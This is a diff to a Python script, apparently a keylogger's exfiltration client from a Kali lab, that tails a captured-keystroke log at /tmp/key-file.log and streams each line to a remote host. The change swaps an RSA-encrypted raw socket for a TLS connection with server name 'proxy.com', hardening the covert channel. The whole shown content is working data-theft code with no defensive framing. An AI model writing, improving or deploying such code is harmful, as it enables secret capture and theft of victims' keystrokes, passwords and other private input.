@@ -3,6 +3,7 @@
 import os
 import sys
 import socket
+import ssl
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 import time
@@ -62,27 +63,26 @@ def main():
     except:
         filesize = 0
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        public_key = s.recv(1024)
-        # Importing keys from variable, converting it into the RsaKey object.
-        pu_key = RSA.import_key(public_key.decode())
-        # Instantiating PKCS1_OAEP object with the public key for encryption
-        cipher = PKCS1_OAEP.new(key=pu_key)
-        while file_exists != True or filesize == 0:
-            file_exists = os.path.exists("/tmp/key-file.log")
-            try:
-                filesize = os.path.getsize("/tmp/key-file.log")
-            except:
-                filesize = 0
-        f = open("/tmp/key-file.log", "rb")
-        filelines = follow(f)
-        for line in filelines:
-            cipher_text = cipher.encrypt(line)
-            print(cipher_text)
-            s.sendall(cipher_text)
-        s.close()
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.load_verify_locations('/home/kali/Desktop/public.pem')
 
+    conn = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname="proxy.com")
+    conn.connect((HOST, PORT))
+    cert = conn.getpeercert()
+
+    while file_exists != True or filesize == 0:
+        file_exists = os.path.exists("/tmp/key-file.log")
+        try:
+            filesize = os.path.getsize("/tmp/key-file.log")
+        except:
+            filesize = 0
+
+    f = open("/tmp/key-file.log", "rb")
+    filelines = follow(f)
+    for line in filelines:
+        print(line)
+        conn.sendall(line)
+    conn.close()
     print("Enviado el fichero entero.")
 
 if __name__ == '__main__':
